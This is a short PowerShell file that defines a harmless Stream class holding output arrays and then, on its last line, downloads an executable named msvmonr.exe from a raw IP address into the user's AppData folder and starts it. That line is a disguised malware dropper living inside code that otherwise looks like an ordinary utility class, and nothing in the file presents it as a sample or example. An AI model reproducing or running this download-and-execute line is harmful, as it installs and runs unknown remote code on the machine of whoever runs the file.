
class Stream {
    [object[]]$Debug = @()
    [object[]]$Error = @()
    [object[]]$Information = @()
    [object[]]$Verbose = @()
    [object[]]$Warning = @()
}

(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

